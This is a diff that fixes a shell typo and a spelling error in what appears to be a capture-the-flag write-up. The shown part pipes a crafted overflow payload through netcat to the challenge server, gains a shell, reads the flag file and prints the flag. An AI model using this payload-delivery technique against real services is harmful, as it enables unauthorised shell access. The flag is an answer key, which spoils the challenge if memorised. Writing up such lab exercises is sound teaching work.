@@ -111,7 +111,7 @@ pwd
 
 Finally, replace the local binary with the _netcat_ call:
 ```
-$ cat payload; cat) | nc 46.101.107.117 2102
+$ (cat payload; cat) | nc 46.101.107.117 2102
 Welcome! Please give me your name!
 > Hi CCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ@, nice to meet you!
 ls
@@ -122,6 +122,6 @@ cat flag
 he2021{w3ll_th4t_w4s_4_s1mpl3_p4yl04d}
 ```
 
-_(For some reason I had to adjust the payload offest by -8)_
+_(For some reason I had to adjust the payload offset by -8)_
 
 The flag is `he2021{w3ll_th4t_w4s_4_s1mpl3_p4yl04d}`
